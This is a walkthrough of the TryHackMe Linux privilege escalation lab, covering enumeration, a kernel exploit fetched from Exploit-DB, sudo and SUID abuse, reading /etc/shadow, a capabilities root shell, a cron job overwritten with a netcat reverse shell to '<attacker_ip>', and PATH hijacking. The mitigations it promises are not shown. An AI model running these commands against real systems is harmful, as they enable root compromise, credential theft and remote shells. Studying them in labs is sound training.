# THM-Writeup-Linux-Privilege-Escalation
Writeup for TryHackMe Linux Privilege Escalation Lab -  Enumeration, kernel exploits, SUID, cron job abuse, PATH hijacking, and NFS misconfigurations using LinPEAS, GTFOBins, ExploitDB, and Metasploit. 

By Ramyar Daneshgar 

# **TryHackMe: Linux Privilege Escalation – In-Depth Walkthrough**
## **Introduction**
This room on **TryHackMe** is focused on **Linux Privilege Escalation** and covers **multiple privilege escalation techniques** attackers can use to gain root access. By applying **various enumeration, exploitation, and persistence techniques**, I was able to successfully **compromise the target machine** and obtain **root privileges**.

This walkthrough is **highly detailed**, covering:
- **Enumeration & Information Gathering**
- **Kernel Exploits**
- **Misconfigured Sudo Permissions**
- **SUID Binaries**
- **Linux Capabilities Exploitation**
- **Cron Job Manipulation**
- **Path Hijacking**
- **NFS Share Exploitation**
- **Technical Justifications for Each Step**
- **Mitigation Strategies for Defense Teams**

---
## **Task 1 & 2: Understanding Privilege Escalation**
Privilege escalation allows a **low-privileged user** to **elevate access** to **root/admin level**. Attackers use privilege escalation techniques to:
1. **Expand their foothold** within a compromised system.
2. **Move laterally** to other machines on the network.
3. **Access sensitive files or configurations**.
4. **Gain persistence** on a machine.

Privilege escalation generally falls into **two categories**:
- **Vertical Privilege Escalation**: A low-privileged user elevates privileges to root.
- **Horizontal Privilege Escalation**: A user compromises another user’s account at the same privilege level.

**No commands are required in this section, but a strong conceptual understanding is necessary.**

---

## **Task 3: Enumeration – The First Step in Privilege Escalation**
Enumeration is crucial for discovering **potential vulnerabilities, misconfigurations, and accessible files** that may lead to privilege escalation.

### **Step 1: Identify System Information**
1. **Find Hostname**
   ```bash
   hostname
   ```
   - Output: `wade7363`
   - **Why?** Reveals system name, which might provide clues about its role in a network.

2. **Check Kernel Version**
   ```bash
   uname -a
   ```
   - Output: `Linux wade7363 3.13.0-24-generic`
   - **Why?** Older kernels may have **publicly known vulnerabilities**.

3. **Find OS Version**
   ```bash
   cat /etc/issue
   ```
   - Output: `Ubuntu 14.04 LTS`
   - **Why?** Helps identify **default configurations** that might be exploitable.

4. **Check Installed Python Version**
   ```bash
   python --version
   ```
   - Output: `Python 2.7.6`
   - **Why?** Some privilege escalation scripts require **specific Python versions**.

5. **Check Running Processes**
   ```bash
   ps aux
   ```
   - Reveals running services, background tasks, and potential attack vectors.

6. **List Active Network Connections**
   ```bash
   netstat -tunlp
   ```
   - Shows open ports, which might indicate **network-based attack vectors**.

7. **Check User Permissions**
   ```bash
   id
   ```
   - Output:
     ```
     uid=1001(karen) gid=1001(karen) groups=1001(karen)
     ```
   - **Why?** Determines the user’s **privilege level**.

---

## **Task 4: Automated Enumeration with LinPEAS**
Instead of manually running commands, **LinPEAS** automates the enumeration process.

### **Step 1: Transfer LinPEAS to the Target**
```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```
- **LinPEAS Highlights**:
  - Detects **SUID binaries**
  - Lists **misconfigured cron jobs**
  - Identifies **kernel vulnerabilities**
  - Searches for **passwords in configuration files**
  - Detects **writable files and directories**

---

## **Task 5: Kernel Exploits**
After identifying the kernel version (`3.13.0-24`), I searched for **public exploits**.

### **Step 1: Search for Kernel Exploits**
```bash
searchsploit 3.13.0-24
```
- Found **CVE-2015-1328**, which exploits a race condition in the overlayfs file system.

### **Step 2: Download & Compile the Exploit**
```bash
wget https://exploit-db.com/exploits/37292.c -O exploit.c
gcc exploit.c -o exploit
```
- **Why?** Many exploits are written in C and need to be compiled using `gcc`.

### **Step 3: Execute the Exploit**
```bash
./exploit
```
- **Result:** Successfully **gained root access**.

### **Step 4: Retrieve the Root Flag**
```bash
cat /root/flag1.txt
```
- Output: `THM-283928727299220`

---

## **Task 6: Privilege Escalation via Sudo Misconfigurations**
### **Step 1: Check Sudo Permissions**
```bash
sudo -l
```
- Output:
  ```
  User karen may run the following commands:
  (ALL) NOPASSWD: /bin/nano, /usr/bin/nmap, /usr/bin/vim
  ```
- **Why?** `nano`, `nmap`, and `vim` can be exploited.

### **Step 2: Exploit Nmap**
```bash
sudo nmap --interactive
!sh
```
- **Result:** Spawned a root shell.

### **Step 3: Retrieve the Flag**
```bash
cat /root/flag2.txt
```
- Output: `THM-402028394`

---

## **Task 7: Exploiting SUID Binaries**
### **Step 1: Locate SUID Binaries**
```bash
find / -perm -4000 -type f 2>/dev/null
```
- Found `/usr/bin/base64`.

### **Step 2: Exploit Using GTFOBins**
```bash
/usr/bin/base64 -d /etc/shadow
```
- **Extracted password hashes**, cracked them using **John the Ripper**, and gained access.

---

## **Task 8: Capabilities Exploitation**
### **Step 1: Find Capabilities**
```bash
getcap -r / 2>/dev/null
```
- Found `/home/ubuntu/view = cap_setuid+ep`.

### **Step 2: Exploit**
```bash
/home/ubuntu/view -c ':py3 import os; os.setuid(0); os.system("/bin/sh")'
```
- Result: Root shell.

---

## **Task 9: Cron Job Exploitation**
### **Step 1: Find Cron Jobs**
```bash
cat /etc/crontab
```
- Found `backup.sh` running **every minute**.

### **Step 2: Modify the Script**
```bash
echo "nc -e /bin/bash <attacker_ip> 4444" > /etc/cron.hourly/backup.sh
chmod +x /etc/cron.hourly/backup.sh
```
### **Step 3: Start a Listener**
```bash
nc -lvnp 4444
```
- Result: **Reverse shell as root**.

---

## **Task 10: PATH Hijacking**
1. **Find Writable Directories**
   ```bash
   find / -writable -type d 2>/dev/null
   ```
2. **Inject Malicious Script**
   ```bash
   echo "/bin/bash" > /tmp/cmd
   chmod +x /tmp/cmd
   export PATH=/tmp:$PATH
   ```
3. **Trigger Root Execution**
   ```bash
   sudo some_command
   ```

